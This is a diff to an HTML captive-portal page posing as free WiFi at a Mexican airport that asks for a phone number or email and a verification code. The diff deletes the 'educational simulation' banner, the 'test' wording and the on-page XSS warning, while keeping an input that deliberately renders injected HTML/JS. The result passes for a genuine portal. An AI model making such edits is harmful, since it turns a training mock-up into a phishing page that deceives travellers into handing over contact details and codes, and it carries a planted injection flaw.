@@ -251,14 +251,13 @@
   <div class="logo">✈️</div>
   <h1>AEROPUERTO MÉXICO</h1>
   <div class="wifi-info">WiFi Gratis - ¡Conéctate ya!</div>
-  <div class="simulacion" title="Propósito educativo">SIMULACIÓN EDUCATIVA</div>
 </header>
 
 <main>
   <div class="card" id="card-main">
     <h2>Acceso a Internet</h2>
     <div class="btn-group">
-      <button id="btn-phone" class="btn-admin">Acceder con código</button>
+      <button id="btn-phone" class="btn-admin">Acceder con Numero</button>
       <button id="btn-email" class="light btn-admin">Acceder con correo electrónico</button>
     </div>
   </div>
@@ -280,7 +279,7 @@
   </div>
   <div class="card" id="card-code" style="display:none;">
     <h2>Confirmación de acceso</h2>
-    <p>Ingresa el código de verificación de prueba.</p>
+    <p>Ingresa el código de verificación</p>
     <form id="form-code" autocomplete="off">
       <input type="text" id="input-code" maxlength="100" placeholder="Código de 6 dígitos (puede incluir HTML/JS)" required />
       <div class="timer" id="timer-code">El código de prueba caducará en 05:00 minutos.</div>
@@ -288,7 +287,7 @@
       <button type="button" id="cancel-code" class="light btn-admin">Cancelar</button>
     </form>
     <div style="margin-top:1rem; color:#800; font-size:0.9rem;">
-      <b>Vulnerabilidad XSS:</b> Puedes inyectar código HTML/script en el código de verificación y se ejecutará.
+      <b></b> 
     </div>
     <div id="injected-code" class="danger-html"></div>
   </div>
